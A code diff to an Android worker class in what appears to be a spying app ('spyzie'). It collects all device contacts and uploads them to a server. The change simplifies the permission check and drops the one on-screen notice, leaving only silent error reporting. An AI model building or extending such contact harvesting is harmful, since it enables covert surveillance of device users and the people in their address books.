@@ -1,11 +1,9 @@
 package com.tantd.spyzie.data.device.worker;
 
-import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.provider.ContactsContract;
-import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.work.Worker;
@@ -41,18 +39,13 @@ public class GetContactsWorker extends Worker {
     public Result doWork() {
         SpyzieApplication.getInstance().getServiceComponent().inject(this);
 
-        if (!CommonUtils.hasContactPermission(getApplicationContext())) {
+        if (CommonUtils.hasContactPermission(getApplicationContext())) {
+            mApiManager.sendContactsData(getAllContacts());
+            return Result.success();
+        } else {
             mApiManager.sendExceptionTracking(Error.HAS_NO_READ_CONTACTS_PERMISSION);
             return Result.failure();
         }
-
-        if (CommonUtils.hasPermissions(getApplicationContext(), new String[]{Manifest.permission.READ_CONTACTS})) {
-            mApiManager.sendContactsData(getAllContacts());
-        } else {
-            Toast.makeText(getApplicationContext(), "Has no permission", Toast.LENGTH_SHORT).show();
-            mApiManager.sendExceptionTracking(Error.HAS_NO_READ_CONTACTS_PERMISSION);
-        }
-        return Result.success();
     }
 
     private List<Contact> getAllContacts() {
